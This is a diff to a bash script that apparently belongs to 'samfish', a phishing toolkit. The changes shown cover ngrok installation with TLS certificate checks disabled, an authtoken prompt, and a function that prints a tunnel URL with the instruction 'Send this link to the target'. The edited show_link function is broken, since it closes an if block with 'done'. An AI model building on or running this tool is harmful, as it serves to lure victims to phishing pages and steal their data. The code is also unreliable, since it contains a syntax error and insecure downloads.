@@ -13,7 +13,7 @@ packages_install(){
     else
     echo "[~] Installing ngrok..."
     sleep 2
-    if [[ `command -v wget` && `command -v unzip` && `command -v curl` ]]; then
+    if [[ `command -v wget` && `command -v unzip` ]]; then
     wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip >/dev/null 2>&1 
     unzip ngrok-stable-linux-amd64.zip && rm -rf ngrok-stable-linux-amd64.zip >/dev/null 2>&1
     chmod +x ngrok >/dev/null 2>&1
@@ -21,7 +21,7 @@ packages_install(){
     read -p "[+] Paste your authtoken: " token
     ./ngrok authtoken $token >/dev/null 2>&1
     else 
-    sudo apt install wget -y >/dev/null 2>&1 && sudo apt install unzip -y >/dev/null 2>&1 && sudo apt install curl -y >/dev/null 2>&1
+    sudo apt install wget -y >/dev/null 2>&1 && sudo apt install unzip -y >/dev/null 2>&1
     wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip >/dev/null 2>&1 && unzip ngrok-stable-linux-amd64.zip && rm -rf ngrok-stable-linux-amd64.zip && chmod +x ngrok >/dev/null 2>&1
     printf "[~] Create an account at ngrok.com and paste the authtoken here (If you have already configured the authtoken, press enter)\n."
     read -p "[+] Paste your authtoken: " token 
@@ -44,7 +44,7 @@ echo "   >   :::: ::   ::   :::  :::     ::    ::        ::  :::: ::   ::   ::: 
 echo "   >   :: : :     :   : :   :      :     :        :    :: : :     :   : :  >"
 echo "   >                                                                       >"
 echo "   >  Developed by Munazir                                                 >"
-echo "   >  github.com/Munazirul/samfish                                v2.3     >"
+echo "   >  github.com/Munazirul/samfish                                v2.4     >"
 echo "   >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
 echo ""  
 echo ""                                                                 
@@ -238,8 +238,14 @@ start
 fi
 }
 show_link(){
+    if [[ `command -v curl` ]]; then
     link=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
     printf "\n[+] Send this link to the target: http://$link\n"
+    else
+    sudo apt install curl -y >/dev/null 2>&1
+    link=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
+    printf "\n[+] Send this link to the target: http://$link\n"
+    done
 }
 stop() {
 
